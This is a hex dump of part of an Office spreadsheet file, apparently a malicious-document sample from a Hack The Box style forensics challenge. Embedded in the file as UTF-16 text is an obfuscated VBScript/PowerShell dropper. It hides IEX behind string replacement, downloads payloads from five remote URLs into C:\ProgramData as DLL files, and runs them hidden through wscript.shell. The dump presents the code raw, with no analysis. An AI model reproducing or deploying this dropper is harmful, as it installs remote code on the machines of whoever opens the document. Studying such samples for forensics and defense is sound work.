0000a430: a5b3 4bc8 f059 ae70 feaa c5af 0f56 926c  ..K..Y.p.....V.l
0000a440: 02ee ee45 c1a9 37a0 13fe 1041 8855 eb65  ...E..7....A.U.e
0000a450: 65c0 8008 7877 50ce ac19 1078 1996 27b2  e...xwP....x..'.
0000a460: 22fe 160a d32c ed9a 6fa3 740c 65eb 88a6  "....,..o.t.e...
0000a470: 119a 5514 3399 6770 9dca 733a fa2a b781  ..U.3.gp..s:.*..
0000a480: 7135 3b33 18d4 30c9 ac10 0e42 5560 4da3  q5;3..0....BU`M.
0000a490: 5ad5 34af 1a19 8795 55f7 6221 6539 2369  Z.4.....U.b!e9#i
0000a4a0: 1635 d3ca 2aaa 6aba b398 b5c3 bc0c 2cd8  .5..*.j.......,.
0000a4b0: f27a 45de 6035 3731 e434 b3c2 67a9 7b31  .zE.`571.4..g.{1
0000a4c0: e56e ce73 dd42 9f90 5709 3078 6e3f 47d5  .n.s.B..W.0xn?G.
0000a4d0: bd44 4130 a815 9b59 d414 e3e5 34ac 72f6  .DA0...Y....4.r.
0000a4e0: 6cd5 ae1d f303 5e40 ed32 45c2 c8fa b5b9  l.....^@.2E.....
0000a4f0: da05 bbe5 35c2 b91d 2c5e abf2 83dc 62d4  ....5...,^....b.
0000a500: c2d2 68de 576a 4beb b7e6 e68b 6d36 3886  ..h.WjK.....m68.
0000a510: e4d1 862e 7742 a5d0 ae84 c92e 47d0 10f5  ....wB......G...
0000a520: 744f 92a7 0d2d bafd 2f00 0000 ffff 0300  tO...-../.......
0000a530: 504b 0304 1400 0600 0800 0000 2100 0dd1  PK..........!...
0000a540: 909f b600 0000 1b01 0000 2700 0000 7468  ..........'...th
0000a550: 656d 652f 7468 656d 652f 5f72 656c 732f  eme/theme/_rels/
0000a560: 7468 656d 654d 616e 6167 6572 2e78 6d6c  themeManager.xml
0000a570: 2e72 656c 7384 8f4d 0ac2 3014 84f7 8277  .rels..M..0....w
0000a580: 086f 6fd3 ba10 9126 dd88 d0ad d403 84e4  .oo....&........
0000a590: 350d 363f 2451 eced 0dae 2c08 2e87 61be  5.6?$Q....,...a.
0000a5a0: 9969 bb97 9dc9 1363 32de 3168 aa1a 083a  .i.....c2.1h...:
0000a5b0: e995 719a c16d b8ec 8e40 5216 4e89 d93b  ..q..m...@R.N..;
0000a5c0: 64b0 6082 8e6f 37ed 1567 914b 284d 2624  d.`..o7..g.K(M&$
0000a5d0: 5228 2e31 9872 0e27 4a93 9cd0 8a54 f980  R(.1.r.'J....T..
0000a5e0: ae38 a38f 56e4 22a3 a641 c8bb d048 f775  .8..V."..A...H.u
0000a5f0: 7da0 f19b 017c c524 bd62 107b d500 1996  }....|.$.b.{....
0000a600: 509a ffb3 fd38 1a89 672f 1f16 5dfe 5141  P....8..g/..].QA
0000a610: 73d9 8505 28a2 c6cc e023 9baa 4c04 ca5b  s...(....#..L..[
0000a620: baba c4df 0000 00ff ff03 0050 4b01 022d  ...........PK..-
0000a630: 0014 0006 0008 0000 0021 00e9 de0f bfff  .........!......
0000a640: 0000 001c 0200 0013 0000 0000 0000 0000  ................
0000a650: 0000 0000 0000 0000 005b 436f 6e74 656e  .........[Conten
0000a660: 745f 5479 7065 735d 2e78 6d6c 504b 0102  t_Types].xmlPK..
0000a670: 2d00 1400 0600 0800 0000 2100 a5d6 a7e7  -.........!.....
0000a680: c000 0000 3601 0000 0b00 0000 0000 0000  ....6...........
0000a690: 0000 0000 0000 3001 0000 5f72 656c 732f  ......0..._rels/
0000a6a0: 2e72 656c 7350 4b01 022d 0014 0006 0008  .relsPK..-......
0000a6b0: 0000 0021 006b 7996 1683 0000 008a 0000  ...!.ky.........
0000a6c0: 001c 0000 0000 0000 0000 0000 0000 0019  ................
0000a6d0: 0200 0074 6865 6d65 2f74 6865 6d65 2f74  ...theme/theme/t
0000a6e0: 6865 6d65 4d61 6e61 6765 722e 786d 6c50  hemeManager.xmlP
0000a6f0: 4b01 022d 0014 0006 0008 0000 0021 00c2  K..-.........!..
0000a700: 3a8e f5e0 0600 00b3 1f00 0016 0000 0000  :...............
0000a710: 0000 0000 0000 0000 00d6 0200 0074 6865  .............the
0000a720: 6d65 2f74 6865 6d65 2f74 6865 6d65 312e  me/theme/theme1.
0000a730: 786d 6c50 4b01 022d 0014 0006 0008 0000  xmlPK..-........
0000a740: 0021 000d d190 9fb6 0000 001b 0100 0027  .!.............'
0000a750: 0000 0000 0000 0000 0000 0000 00ea 0900  ................
0000a760: 0074 6865 6d65 2f74 6865 6d65 2f5f 7265  .theme/theme/_re
0000a770: 6c73 2f74 6865 6d65 4d61 6e61 6765 722e  ls/themeManager.
0000a780: 786d 6c2e 7265 6c73 504b 0506 0000 0000  xml.relsPK......
0000a790: 0500 0500 5d01 0000 e50a 0000 0000 3c3f  ....].........<?
0000a7a0: 786d 6c20 7665 7273 696f 6e3d 2231 2e30  xml version="1.0
0000a7b0: 2220 656e 636f 6469 6e67 3d22 5554 462d  " encoding="UTF-
0000a7c0: 3822 2073 7461 6e64 616c 6f6e 653d 2279  8" standalone="y
0000a7d0: 6573 223f 3e0d 0a3c 613a 636c 724d 6170  es"?>..<a:clrMap
0000a7e0: 2078 6d6c 6e73 3a61 3d22 6874 7470 3a2f   xmlns:a="http:/
0000a7f0: 2f73 6368 656d 6173 2e6f 7065 6e78 6d6c  /schemas.openxml
0000a800: 666f 726d 6174 732e 6f72 672f 6472 6177  formats.org/draw
0000a810: 696e 676d 6c2f 3230 3036 2f6d 6169 6e22  ingml/2006/main"
0000a820: 2062 6731 3d22 6c74 3122 2074 7831 3d22   bg1="lt1" tx1="
0000a830: 646b 3122 2062 6732 3d22 6c74 3222 2074  dk1" bg2="lt2" t
0000a840: 7832 3d22 646b 3222 2061 6363 656e 7431  x2="dk2" accent1
0000a850: 3d22 6163 6365 6e74 3122 2061 6363 656e  ="accent1" accen
0000a860: 7432 3d22 6163 6365 6e74 3222 2061 6363  t2="accent2" acc
0000a870: 656e 7433 3d22 6163 6365 6e74 3322 2061  ent3="accent3" a
0000a880: 6363 656e 7434 3d22 6163 6365 6e74 3422  ccent4="accent4"
0000a890: 2061 6363 656e 7435 3d22 6163 6365 6e74   accent5="accent
0000a8a0: 3522 2061 6363 656e 7436 3d22 6163 6365  5" accent6="acce
0000a8b0: 6e74 3622 2068 6c69 6e6b 3d22 686c 696e  nt6" hlink="hlin
0000a8c0: 6b22 2066 6f6c 486c 696e 6b3d 2266 6f6c  k" folHlink="fol
0000a8d0: 486c 696e 6b22 2f3e 0000 0000 d801 0000  Hlink"/>........
0000a8e0: 2100 0010 0000 0000 ffff ffff 0008 0000  !...............
0000a8f0: 3009 0000 d809 0000 0500 0000 0700 0000  0...............
0000a900: 0008 0000 d809 0000 0600 0000 0f00 00f0  ................
0000a910: 6c00 0000 0000 06f0 1800 0000 0404 0000  l...............
0000a920: 0200 0000 0300 0000 0100 0000 0100 0000  ................
0000a930: 0400 0000 1f00 01f0 2c00 0000 6200 07f0  ........,...b...
0000a940: 2400 0000 0606 12ce 40ac 6e7f 1d57 07c4  $.......@.n..W..
0000a950: 282e d144 3f3d ff00 3281 0000 0200 0000  (..D?=..2.......
0000a960: 2e10 0000 0000 4d52 4000 1ef1 1000 0000  ......MR@.......
0000a970: ffff 0000 0000 ff00 8080 8000 f700 0010  ................
0000a980: 000f 0002 f0e6 2700 0010 0008 f008 0000  ......'.........
0000a990: 0003 0000 0003 0400 000f 0003 f07e 2700  .............~'.
0000a9a0: 000f 0004 f028 0000 0001 0009 f010 0000  .....(..........
0000a9b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000a9c0: 0002 000a f008 0000 0000 0400 0005 0000  ................
0000a9d0: 000f 0004 f04e 0e00 00b2 040a f008 0000  .....N..........
0000a9e0: 0002 0400 0000 0a00 0063 000b f00a 0e00  .........c......
0000a9f0: 0004 4101 0000 0005 c10e 0000 0006 0102  ..A.............
0000aa00: 0000 00ff 0100 0008 0081 c3d8 0d00 00bf  ................
0000aa10: 0320 0020 006d 0062 0063 006f 0069 006e  . . .m.b.c.o.i.n
0000aa20: 0000 0044 0069 006d 0020 0057 0041 0049  ...D.i.m. .W.A.I
0000aa30: 0054 0050 004c 005a 002c 0020 0057 0053  .T.P.L.Z.,. .W.S
0000aa40: 002c 0020 006b 002c 0020 006b 006c 000d  .,. .k.,. .k.l..
0000aa50: 000a 0057 0041 0049 0054 0050 004c 005a  ...W.A.I.T.P.L.Z
0000aa60: 0020 003d 0020 0044 0061 0074 0065 0041  . .=. .D.a.t.e.A
0000aa70: 0064 0064 0028 0043 0068 0072 0028 0031  .d.d.(.C.h.r.(.1
0000aa80: 0031 0035 0029 002c 0020 0034 002c 0020  .1.5.).,. .4.,. 
0000aa90: 004e 006f 0077 0028 0029 0029 000d 000a  .N.o.w.(.).)....
0000aaa0: 0044 006f 0020 0055 006e 0074 0069 006c  .D.o. .U.n.t.i.l
0000aab0: 0020 0028 004e 006f 0077 0028 0029 0020  . .(.N.o.w.(.). 
0000aac0: 003e 0020 0057 0041 0049 0054 0050 004c  .>. .W.A.I.T.P.L
0000aad0: 005a 0029 000d 000a 004c 006f 006f 0070  .Z.).....L.o.o.p
0000aae0: 000d 000a 000d 000a 004c 004c 0031 0020  .........L.L.1. 
0000aaf0: 003d 0020 0022 0024 004e 0061 006e 006f  .=. .".$.N.a.n.o
0000ab00: 003d 0027 004a 004f 004f 0045 0058 0027  .=.'.J.O.O.E.X.'
0000ab10: 002e 0072 0065 0070 006c 0061 0063 0065  ...r.e.p.l.a.c.e
0000ab20: 0028 0027 004a 004f 004f 0027 002c 0027  .(.'.J.O.O.'.,.'
0000ab30: 0049 0027 0029 003b 0073 0061 006c 0020  .I.'.).;.s.a.l. 
0000ab40: 004f 0059 0020 0024 004e 0061 006e 006f  .O.Y. .$.N.a.n.o
0000ab50: 003b 0024 0061 0061 003d 0027 0028 004e  .;.$.a.a.=.'.(.N
0000ab60: 0065 0077 002d 004f 0062 0027 003b 0020  .e.w.-.O.b.'.;. 
0000ab70: 0024 0071 0071 003d 0027 006a 0065 0063  .$.q.q.=.'.j.e.c
0000ab80: 0074 0020 004e 0065 0027 003b 0020 0024  .t. .N.e.'.;. .$
0000ab90: 0077 0077 003d 0027 0074 002e 0057 0065  .w.w.=.'.t...W.e
0000aba0: 0062 0043 006c 0069 0027 003b 0020 0024  .b.C.l.i.'.;. .$
0000abb0: 0065 0065 003d 0027 0065 006e 0074 0029  .e.e.=.'.e.n.t.)
0000abc0: 002e 0044 006f 0077 006e 006c 0027 003b  ...D.o.w.n.l.'.;
0000abd0: 0020 0024 0072 0072 003d 0027 006f 0061  . .$.r.r.=.'.o.a
0000abe0: 0064 0046 0069 006c 0065 0027 003b 0020  .d.F.i.l.e.'.;. 
0000abf0: 0024 0062 0062 003d 0027 0028 0027 0027  .$.b.b.=.'.(.'.'
0000ac00: 0068 0074 0074 0070 003a 002f 002f 0070  .h.t.t.p.:././.p
0000ac10: 0072 0069 0079 0061 0063 0061 0072 0065  .r.i.y.a.c.a.r.e
0000ac20: 0065 0072 0073 002e 0068 0074 0062 002f  .e.r.s...h.t.b./
0000ac30: 0075 0039 0068 0044 0051 004e 0039 0059  .u.9.h.D.Q.N.9.Y
0000ac40: 0079 0037 0067 002f 0070 0074 002e 0068  .y.7.g./.p.t...h
0000ac50: 0074 006d 006c 0027 0027 002c 0027 0027  .t.m.l.'.'.,.'.'
0000ac60: 0043 003a 005c 0050 0072 006f 0067 0072  .C.:.\.P.r.o.g.r
0000ac70: 0061 006d 0044 0061 0074 0061 005c 0077  .a.m.D.a.t.a.\.w
0000ac80: 0077 0077 0031 002e 0064 006c 006c 0027  .w.w.1...d.l.l.'
0000ac90: 0027 0029 0027 003b 0024 0046 004f 004f  .'.).'.;.$.F.O.O
0000aca0: 0058 0020 003d 0028 0024 0061 0061 002c  .X. .=.(.$.a.a.,
0000acb0: 0024 0071 0071 002c 0024 0077 0077 002c  .$.q.q.,.$.w.w.,
0000acc0: 0024 0065 0065 002c 0024 0072 0072 002c  .$.e.e.,.$.r.r.,
0000acd0: 0024 0062 0062 002c 0024 0063 0063 0020  .$.b.b.,.$.c.c. 
0000ace0: 002d 004a 006f 0069 006e 0020 0027 0027  .-.J.o.i.n. .'.'
0000acf0: 0029 003b 0020 004f 0059 0020 0024 0046  .).;. .O.Y. .$.F
0000ad00: 004f 004f 0058 007c 004f 0059 003b 0022  .O.O.X.|.O.Y.;."
0000ad10: 000d 000a 004c 004c 0032 0020 003d 0020  .....L.L.2. .=. 
0000ad20: 0022 0024 004e 0061 006e 006f 007a 003d  .".$.N.a.n.o.z.=
0000ad30: 0027 004a 004f 004f 0045 0058 0027 002e  .'.J.O.O.E.X.'..
0000ad40: 0072 0065 0070 006c 0061 0063 0065 0028  .r.e.p.l.a.c.e.(
0000ad50: 0027 004a 004f 004f 0027 002c 0027 0049  .'.J.O.O.'.,.'.I
0000ad60: 0027 0029 003b 0073 0061 006c 0020 004f  .'.).;.s.a.l. .O
0000ad70: 0059 0020 0024 004e 0061 006e 006f 007a  .Y. .$.N.a.n.o.z
0000ad80: 003b 0024 0061 0061 003d 0027 0028 004e  .;.$.a.a.=.'.(.N
0000ad90: 0065 0077 002d 004f 0062 0027 003b 0020  .e.w.-.O.b.'.;. 
0000ada0: 0024 0071 0071 003d 0027 006a 0065 0063  .$.q.q.=.'.j.e.c
0000adb0: 0074 0020 004e 0065 0027 003b 0020 0024  .t. .N.e.'.;. .$
0000adc0: 0077 0077 003d 0027 0074 002e 0057 0065  .w.w.=.'.t...W.e
0000add0: 0062 0043 006c 0069 0027 003b 0020 0024  .b.C.l.i.'.;. .$
0000ade0: 0065 0065 003d 0027 0065 006e 0074 0029  .e.e.=.'.e.n.t.)
0000adf0: 002e 0044 006f 0077 006e 006c 0027 003b  ...D.o.w.n.l.'.;
0000ae00: 0020 0024 0072 0072 003d 0027 006f 0061  . .$.r.r.=.'.o.a
0000ae10: 0064 0046 0069 006c 0065 0027 003b 0020  .d.F.i.l.e.'.;. 
0000ae20: 0024 0062 0062 003d 0027 0028 0027 0027  .$.b.b.=.'.(.'.'
0000ae30: 0068 0074 0074 0070 0073 003a 002f 002f  .h.t.t.p.s.:././
0000ae40: 0070 0065 0072 0066 0065 0063 0074 0064  .p.e.r.f.e.c.t.d
0000ae50: 0065 006d 006f 0073 002e 0068 0074 0062  .e.m.o.s...h.t.b
0000ae60: 002f 0047 0076 0031 0069 004e 0041 0075  ./.G.v.1.i.N.A.u
0000ae70: 004d 004b 005a 002f 006a 0076 002e 0068  .M.K.Z./.j.v...h
0000ae80: 0074 006d 006c 0027 0027 002c 0027 0027  .t.m.l.'.'.,.'.'
0000ae90: 0043 003a 005c 0050 0072 006f 0067 0072  .C.:.\.P.r.o.g.r
0000aea0: 0061 006d 0044 0061 0074 0061 005c 0077  .a.m.D.a.t.a.\.w
0000aeb0: 0077 0077 0032 002e 0064 006c 006c 0027  .w.w.2...d.l.l.'
0000aec0: 0027 0029 0027 003b 0024 0046 004f 004f  .'.).'.;.$.F.O.O
0000aed0: 0058 0020 003d 0028 0024 0061 0061 002c  .X. .=.(.$.a.a.,
0000aee0: 0024 0071 0071 002c 0024 0077 0077 002c  .$.q.q.,.$.w.w.,
0000aef0: 0024 0065 0065 002c 0024 0072 0072 002c  .$.e.e.,.$.r.r.,
0000af00: 0024 0062 0062 002c 0024 0063 0063 0020  .$.b.b.,.$.c.c. 
0000af10: 002d 004a 006f 0069 006e 0020 0027 0027  .-.J.o.i.n. .'.'
0000af20: 0029 003b 0020 004f 0059 0020 0024 0046  .).;. .O.Y. .$.F
0000af30: 004f 004f 0058 007c 004f 0059 003b 0022  .O.O.X.|.O.Y.;."
0000af40: 000d 000a 004c 004c 0033 0020 003d 0020  .....L.L.3. .=. 
0000af50: 0022 0024 004e 0061 006e 006f 0078 003d  .".$.N.a.n.o.x.=
0000af60: 0027 004a 004f 004f 0045 0058 0027 002e  .'.J.O.O.E.X.'..
0000af70: 0072 0065 0070 006c 0061 0063 0065 0028  .r.e.p.l.a.c.e.(
0000af80: 0027 004a 004f 004f 0027 002c 0027 0049  .'.J.O.O.'.,.'.I
0000af90: 0027 0029 003b 0073 0061 006c 0020 004f  .'.).;.s.a.l. .O
0000afa0: 0059 0020 0024 004e 0061 006e 006f 0078  .Y. .$.N.a.n.o.x
0000afb0: 003b 0024 0061 0061 003d 0027 0028 004e  .;.$.a.a.=.'.(.N
0000afc0: 0065 0077 002d 004f 0062 0027 003b 0020  .e.w.-.O.b.'.;. 
0000afd0: 0024 0071 0071 003d 0027 006a 0065 0063  .$.q.q.=.'.j.e.c
0000afe0: 0074 0020 004e 0065 0027 003b 0020 0024  .t. .N.e.'.;. .$
0000aff0: 0077 0077 003d 0027 0074 002e 0057 0065  .w.w.=.'.t...W.e
0000b000: 0062 0043 006c 0069 0027 003b 0020 0024  .b.C.l.i.'.;. .$
0000b010: 0065 0065 003d 0027 0065 006e 0074 0029  .e.e.=.'.e.n.t.)
0000b020: 002e 0044 006f 0077 006e 006c 0027 003b  ...D.o.w.n.l.'.;
0000b030: 0020 0024 0072 0072 003d 0027 006f 0061  . .$.r.r.=.'.o.a
0000b040: 0064 0046 0069 006c 0065 0027 003b 0020  .d.F.i.l.e.'.;. 
0000b050: 0024 0062 0062 003d 0027 0028 0027 0027  .$.b.b.=.'.(.'.'
0000b060: 0068 0074 0074 0070 003a 002f 002f 0062  .h.t.t.p.:././.b
0000b070: 0075 0073 0073 0069 006e 0065 0073 0073  .u.s.s.i.n.e.s.s
0000b080: 002d 007a 002e 0068 0074 0062 002f 007a  .-.z...h.t.b./.z
0000b090: 0065 0038 0070 0043 004e 0054 0049 006b  .e.8.p.C.N.T.I.k
0000b0a0: 0072 0049 0053 002f 0077 0070 002e 0068  .r.I.S./.w.p...h
0000b0b0: 0074 006d 006c 0027 0027 002c 0027 0027  .t.m.l.'.'.,.'.'
0000b0c0: 0043 003a 005c 0050 0072 006f 0067 0072  .C.:.\.P.r.o.g.r
0000b0d0: 0061 006d 0044 0061 0074 0061 005c 0077  .a.m.D.a.t.a.\.w
0000b0e0: 0077 0077 0033 002e 0064 006c 006c 0027  .w.w.3...d.l.l.'
0000b0f0: 0027 0029 0027 003b 0024 0046 004f 004f  .'.).'.;.$.F.O.O
0000b100: 0058 0020 003d 0028 0024 0061 0061 002c  .X. .=.(.$.a.a.,
0000b110: 0024 0071 0071 002c 0024 0077 0077 002c  .$.q.q.,.$.w.w.,
0000b120: 0024 0065 0065 002c 0024 0072 0072 002c  .$.e.e.,.$.r.r.,
0000b130: 0024 0062 0062 002c 0024 0063 0063 0020  .$.b.b.,.$.c.c. 
0000b140: 002d 004a 006f 0069 006e 0020 0027 0027  .-.J.o.i.n. .'.'
0000b150: 0029 003b 0020 004f 0059 0020 0024 0046  .).;. .O.Y. .$.F
0000b160: 004f 004f 0058 007c 004f 0059 003b 0022  .O.O.X.|.O.Y.;."
0000b170: 000d 000a 004c 004c 0034 0020 003d 0020  .....L.L.4. .=. 
0000b180: 0022 0024 004e 0061 006e 006f 0063 003d  .".$.N.a.n.o.c.=
0000b190: 0027 004a 004f 004f 0045 0058 0027 002e  .'.J.O.O.E.X.'..
0000b1a0: 0072 0065 0070 006c 0061 0063 0065 0028  .r.e.p.l.a.c.e.(
0000b1b0: 0027 004a 004f 004f 0027 002c 0027 0049  .'.J.O.O.'.,.'.I
0000b1c0: 0027 0029 003b 0073 0061 006c 0020 004f  .'.).;.s.a.l. .O
0000b1d0: 0059 0020 0024 004e 0061 006e 006f 0063  .Y. .$.N.a.n.o.c
0000b1e0: 003b 0024 0061 0061 003d 0027 0028 004e  .;.$.a.a.=.'.(.N
0000b1f0: 0065 0077 002d 004f 0062 0027 003b 0020  .e.w.-.O.b.'.;. 
0000b200: 0024 0071 0071 003d 0027 006a 0065 0063  .$.q.q.=.'.j.e.c
0000b210: 0074 0020 004e 0065 0027 003b 0020 0024  .t. .N.e.'.;. .$
0000b220: 0077 0077 003d 0027 0074 002e 0057 0065  .w.w.=.'.t...W.e
0000b230: 0062 0043 006c 0069 0027 003b 0020 0024  .b.C.l.i.'.;. .$
0000b240: 0065 0065 003d 0027 0065 006e 0074 0029  .e.e.=.'.e.n.t.)
0000b250: 002e 0044 006f 0077 006e 006c 0027 003b  ...D.o.w.n.l.'.;
0000b260: 0020 0024 0072 0072 003d 0027 006f 0061  . .$.r.r.=.'.o.a
0000b270: 0064 0046 0069 006c 0065 0027 003b 0020  .d.F.i.l.e.'.;. 
0000b280: 0024 0062 0062 003d 0027 0028 0027 0027  .$.b.b.=.'.(.'.'
0000b290: 0068 0074 0074 0070 003a 002f 002f 0063  .h.t.t.p.:././.c
0000b2a0: 0061 0062 006c 0069 006e 0067 0070 006f  .a.b.l.i.n.g.p.o
0000b2b0: 0069 006e 0074 002e 0068 0074 0062 002f  .i.n.t...h.t.b./
0000b2c0: 0042 0079 0048 0035 004e 0044 006f 0045  .B.y.H.5.N.D.o.E
0000b2d0: 0033 006b 0051 0041 002f 0076 006d 002e  .3.k.Q.A./.v.m..
0000b2e0: 0068 0074 006d 006c 0027 0027 002c 0027  .h.t.m.l.'.'.,.'
0000b2f0: 0027 0043 003a 005c 0050 0072 006f 0067  .'.C.:.\.P.r.o.g
0000b300: 0072 0061 006d 0044 0061 0074 0061 005c  .r.a.m.D.a.t.a.\
0000b310: 0077 0077 0077 0034 002e 0064 006c 006c  .w.w.w.4...d.l.l
0000b320: 0027 0027 0029 0027 003b 0024 0046 004f  .'.'.).'.;.$.F.O
0000b330: 004f 0058 0020 003d 0028 0024 0061 0061  .O.X. .=.(.$.a.a
0000b340: 002c 0024 0071 0071 002c 0024 0077 0077  .,.$.q.q.,.$.w.w
0000b350: 002c 0024 0065 0065 002c 0024 0072 0072  .,.$.e.e.,.$.r.r
0000b360: 002c 0024 0062 0062 002c 0024 0063 0063  .,.$.b.b.,.$.c.c
0000b370: 0020 002d 004a 006f 0069 006e 0020 0027  . .-.J.o.i.n. .'
0000b380: 0027 0029 003b 0020 004f 0059 0020 0024  .'.).;. .O.Y. .$
0000b390: 0046 004f 004f 0058 007c 004f 0059 003b  .F.O.O.X.|.O.Y.;
0000b3a0: 0022 000d 000a 004c 004c 0035 0020 003d  .".....L.L.5. .=
0000b3b0: 0020 0022 0024 004e 0061 006e 006f 0063  . .".$.N.a.n.o.c
0000b3c0: 003d 0027 004a 004f 004f 0045 0058 0027  .=.'.J.O.O.E.X.'
0000b3d0: 002e 0072 0065 0070 006c 0061 0063 0065  ...r.e.p.l.a.c.e
0000b3e0: 0028 0027 004a 004f 004f 0027 002c 0027  .(.'.J.O.O.'.,.'
0000b3f0: 0049 0027 0029 003b 0073 0061 006c 0020  .I.'.).;.s.a.l. 
0000b400: 004f 0059 0020 0024 004e 0061 006e 006f  .O.Y. .$.N.a.n.o
0000b410: 0063 003b 0024 0061 0061 003d 0027 0028  .c.;.$.a.a.=.'.(
0000b420: 004e 0065 0077 002d 004f 0062 0027 003b  .N.e.w.-.O.b.'.;
0000b430: 0020 0024 0071 0071 003d 0027 006a 0065  . .$.q.q.=.'.j.e
0000b440: 0063 0074 0020 004e 0065 0027 003b 0020  .c.t. .N.e.'.;. 
0000b450: 0024 0077 0077 003d 0027 0074 002e 0057  .$.w.w.=.'.t...W
0000b460: 0065 0062 0043 006c 0069 0027 003b 0020  .e.b.C.l.i.'.;. 
0000b470: 0024 0065 0065 003d 0027 0065 006e 0074  .$.e.e.=.'.e.n.t
0000b480: 0029 002e 0044 006f 0077 006e 006c 0027  .)...D.o.w.n.l.'
0000b490: 003b 0020 0024 0072 0072 003d 0027 006f  .;. .$.r.r.=.'.o
0000b4a0: 0061 0064 0046 0069 006c 0065 0027 003b  .a.d.F.i.l.e.'.;
0000b4b0: 0020 0024 0062 0062 003d 0027 0028 0027  . .$.b.b.=.'.(.'
0000b4c0: 0027 0068 0074 0074 0070 0073 003a 002f  .'.h.t.t.p.s.:./
0000b4d0: 002f 0062 006f 006e 0075 0073 002e 0063  ./.b.o.n.u.s...c
0000b4e0: 006f 0072 0070 006f 0072 0061 0074 0065  .o.r.p.o.r.a.t.e
0000b4f0: 0062 0075 0073 0069 006e 0065 0073 0073  .b.u.s.i.n.e.s.s
0000b500: 006d 0061 0063 0068 0069 006e 0065 0073  .m.a.c.h.i.n.e.s
0000b510: 002e 0068 0074 0062 002f 0031 0059 0030  ...h.t.b./.1.Y.0
0000b520: 0071 0056 004e 0063 0065 002f 0074 007a  .q.V.N.c.e./.t.z
0000b530: 002e 0068 0074 006d 006c 0027 0027 002c  ...h.t.m.l.'.'.,
0000b540: 0027 0027 0043 003a 005c 0050 0072 006f  .'.'.C.:.\.P.r.o
0000b550: 0067 0072 0061 006d 0044 0061 0074 0061  .g.r.a.m.D.a.t.a
0000b560: 005c 0077 0077 0077 0035 002e 0064 006c  .\.w.w.w.5...d.l
0000b570: 006c 0027 0027 0029 0027 003b 0024 0046  .l.'.'.).'.;.$.F
0000b580: 004f 004f 0058 0020 003d 0028 0024 0061  .O.O.X. .=.(.$.a
0000b590: 0061 002c 0024 0071 0071 002c 0024 0077  .a.,.$.q.q.,.$.w
0000b5a0: 0077 002c 0024 0065 0065 002c 0024 0072  .w.,.$.e.e.,.$.r
0000b5b0: 0072 002c 0024 0062 0062 002c 0024 0063  .r.,.$.b.b.,.$.c
0000b5c0: 0063 0020 002d 004a 006f 0069 006e 0020  .c. .-.J.o.i.n. 
0000b5d0: 0027 0027 0029 003b 0020 004f 0059 0020  .'.'.).;. .O.Y. 
0000b5e0: 0024 0046 004f 004f 0058 007c 004f 0059  .$.F.O.O.X.|.O.Y
0000b5f0: 003b 0022 000d 000a 000d 000a 000d 000a  .;."............
0000b600: 0048 0048 0039 003d 0022 0070 006f 0022  .H.H.9.=.".p.o."
0000b610: 000d 000a 0048 0048 0038 003d 0022 0077  .....H.H.8.=.".w
0000b620: 0065 0072 0073 0022 000d 000a 0048 0048  .e.r.s.".....H.H
0000b630: 0037 003d 0022 0068 0022 000d 000a 0048  .7.=.".h.".....H
0000b640: 0048 0036 003d 0022 0065 006c 006c 0020  .H.6.=.".e.l.l. 
0000b650: 0022 000d 000a 0048 0048 0030 003d 0020  .".....H.H.0.=. 
0000b660: 0048 0048 0039 002b 0048 0048 0038 002b  .H.H.9.+.H.H.8.+
0000b670: 0048 0048 0037 002b 0048 0048 0036 000d  .H.H.7.+.H.H.6..
0000b680: 000a 0053 0065 0074 0020 0052 0061 006e  ...S.e.t. .R.a.n
0000b690: 0020 003d 0020 0043 0072 0065 0061 0074  . .=. .C.r.e.a.t
0000b6a0: 0065 004f 0062 006a 0065 0063 0074 0028  .e.O.b.j.e.c.t.(
0000b6b0: 0022 0077 0073 0063 0072 0069 0070 0074  .".w.s.c.r.i.p.t
0000b6c0: 002e 0073 0068 0065 006c 006c 0022 0029  ...s.h.e.l.l.".)
0000b6d0: 000d 000a 0052 0061 006e 002e 0052 0075  .....R.a.n...R.u
0000b6e0: 006e 0020 0048 0048 0030 002b 004c 004c  .n. .H.H.0.+.L.L
0000b6f0: 0031 002c 0043 0068 0072 0028 0034 0038  .1.,.C.h.r.(.4.8
0000b700: 0029 000d 000a 0052 0061 006e 002e 0052  .).....R.a.n...R
0000b710: 0075 006e 0020 0048 0048 0030 002b 004c  .u.n. .H.H.0.+.L
0000b720: 004c 0032 002c 0043 0068 0072 0028 0034  .L.2.,.C.h.r.(.4
0000b730: 0038 0029 000d 000a 0052 0061 006e 002e  .8.).....R.a.n..
0000b740: 0052 0075 006e 0020 0048 0048 0030 002b  .R.u.n. .H.H.0.+
0000b750: 004c 004c 0033 002c 0043 0068 0072 0028  .L.L.3.,.C.h.r.(
0000b760: 0034 0038 0029 000d 000a 0052 0061 006e  .4.8.).....R.a.n
0000b770: 002e 0052 0075 006e 0020 0048 0048 0030  ...R.u.n. .H.H.0
0000b780: 002b 004c 004c 0034 002c 0043 0068 0072  .+.L.L.4.,.C.h.r
0000b790: 0028 0034 0038 0029 000d 000a 0052 0061  .(.4.8.).....R.a
0000b7a0: 006e 002e 0052 0075 006e 0020 0048 0048  .n...R.u.n. .H.H
0000b7b0: 0030 002b 004c 004c 0035 002c 0043 0068  .0.+.L.L.5.,.C.h
0000b7c0: 0072 0028 0034 0038 0029 000d 000a 0057  .r.(.4.8.).....W
0000b7d0: 0073 0063 0072 0069 0070 0074 002e 0053  .s.c.r.i.p.t...S
0000b7e0: 006c 0065 0065 0070 0028 0035 0030 0030  .l.e.e.p.(.5.0.0
0000b7f0: 0030 0029 000d 000a 0000 0023 0022 f10c  .0.).......#."..
0000b800: 0000 00bf 0100 0060 003f 0500 0001 0000  .......`.?......
0000b810: 0010 f004 0000 0001 0000 0000 0011 f004  ................
0000b820: 0000 0001 0000 000f 0004 f0f0 1800 00b2  ................
0000b830: 040a f008 0000 0003 0400 0000 0a00 0063  ...............c
0000b840: 000b f0ac 1800 0004 4101 0000 0005 c10e  ........A.......
0000b850: 0000 0006 0102 0000 00ff 0100 0008 0081  ................
0000b860: c37a 1800 00bf 0320 0020 006d 0062 0063  .z..... . .m.b.c
0000b870: 006f 0069 006e 0000 004d 004d 0031 0020  .o.i.n...M.M.1. 
0000b880: 003d 0020 0022 0024 0062 0020 003d 0020  .=. .".$.b. .=. 
0000b890: 005b 0053 0079 0073 0074 0065 006d 002e  .[.S.y.s.t.e.m..
0000b8a0: 0049 004f 002e 0046 0069 006c 0065 005d  .I.O...F.i.l.e.]
0000b8b0: 003a 003a 0052 0065 0061 0064 0041 006c  .:.:.R.e.a.d.A.l
0000b8c0: 006c 0042 0079 0074 0065 0073 0028 0028  .l.B.y.t.e.s.(.(
